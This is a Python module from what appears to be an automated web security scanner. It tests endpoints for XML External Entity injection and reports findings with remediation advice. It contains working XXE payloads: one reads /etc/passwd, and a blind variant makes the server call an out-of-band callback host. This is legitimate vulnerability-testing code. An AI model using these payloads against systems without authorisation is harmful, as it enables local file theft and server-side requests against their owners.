"""Stage 5: XML External Entity (XXE) injection.

Any endpoint that parses attacker XML with external entities enabled can read
local files or make server-side requests. Black-box, two vectors are reliable
and low-false-positive:

  - in-band: declare an entity pointing at file:///etc/passwd and echo it; a
    `root:…:0:0:` in the response is proof.
  - blind/OOB: declare an external entity on the interactsh callback URL; an
    actual DNS/HTTP interaction is proof even when nothing is reflected.

XML endpoints are hard to enumerate black-box, so this probes the endpoints
most likely to accept XML (SOAP paths and any discovered endpoint) with an
`application/xml` body, and reports only on a file signature or a real
callback — never on a status code or a reflected payload.
"""

import re
import uuid

from modules.base import BaseModule
from tools.wrappers import curl

_SOAP_PATHS = ("/soap", "/services", "/ws", "/xmlrpc.php", "/api/xml",
               "/service.asmx", "/Service.asmx")
_PASSWD = re.compile(r"root:.*?:0:0:", re.S)

_INBAND = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)


def _oob_payload(callback: str) -> str:
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{callback}">]>'
        "<r>&xxe;</r>"
    )


class XXEScan(BaseModule):
    id = "xxe_scan"
    name = "XXE Injection Scan"
    stage = 5
    detectability = "medium"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        base = self.base_url
        targets = self._targets(base)
        if not targets:
            self.state.skip_module(self.id, "no XML-capable endpoints")
            return "skipped"

        oob = self.oob()
        confirmed = 0
        for url in targets[:10]:
            if self.should_stop(reserve=10):
                break
            if await self._inband(base, url):
                confirmed += 1
            elif oob and await self._blind(base, url, oob):
                confirmed += 1

        self.state.complete_module(self.id)
        self.log(f"XXE: {confirmed} confirmed across {len(targets)} endpoint(s)"
                 + ("" if oob else " (no OOB channel — blind XXE not tested)"))
        return "done"

    def _targets(self, base: str) -> list:
        urls = [base.rstrip("/") + p for p in _SOAP_PATHS]
        for atype in ("api_endpoint", "url", "endpoint"):
            for asset in self.state.get_assets_by_type(atype):
                v = str(asset.get("value", "")).strip()
                if v.startswith(("http://", "https://")) and v not in urls:
                    urls.append(v)
        return urls

    async def _post_xml(self, url: str, body: str) -> dict:
        return await curl(url, method="POST", output="full", timeout=12,
                          data=body,
                          headers={"Content-Type": "application/xml",
                                   "Accept": "application/xml, */*"})

    async def _inband(self, base: str, url: str) -> bool:
        try:
            r = await self._post_xml(url, _INBAND)
        except Exception:  # noqa: BLE001
            return False
        if _PASSWD.search(r.get("body", "") or ""):
            self.state.add_finding(
                title="XXE: local file read (in-band)",
                severity="HIGH", confidence="CONFIRMED",
                category="XXE",
                description=f"The endpoint parses external XML entities and "
                            f"returned the contents of /etc/passwd — arbitrary "
                            f"local file read.",
                evidence=[f"POST {url} (application/xml XXE) → root:...:0:0:"],
                remediation="Disable external entity resolution in the XML parser "
                            "(disallow DOCTYPE/DTD).",
                asset_keys=[f"webapp:{base}"],
                verification={"method": "xxe_inband_passwd", "url": url})
            return True
        return False

    async def _blind(self, base: str, url: str, oob) -> bool:
        tag = f"/xxe-{uuid.uuid4().hex[:6]}"
        try:
            corr = await oob.register_callback(f"xxe:{self.domain}:{url}")
            callback = oob.callback_url(corr, tag)
        except Exception:  # noqa: BLE001
            return False
        if not corr or "invalid" in callback:
            return False
        try:
            await oob.poll(corr)                 # drain stale
            await self._post_xml(url, _oob_payload(callback))
        except Exception:  # noqa: BLE001
            pass
        try:
            hits = await oob.poll(corr)
        except Exception:  # noqa: BLE001
            hits = []
        if hits:
            self.state.add_finding(
                title="XXE: blind out-of-band interaction",
                severity="HIGH", confidence="CONFIRMED",
                category="XXE",
                description="An external XML entity on the OOB callback URL "
                            "triggered a server-side interaction — blind XXE, "
                            "a server-side request / exfiltration primitive.",
                evidence=[f"POST {url} (application/xml XXE) → "
                          f"{len(hits)} OOB interaction(s) ({corr[:8]})"],
                remediation="Disable external entity resolution (disallow "
                            "DOCTYPE/DTD) in the XML parser.",
                asset_keys=[f"webapp:{base}"],
                verification={"method": "xxe_oob_callback", "url": url})
            return True
        return False
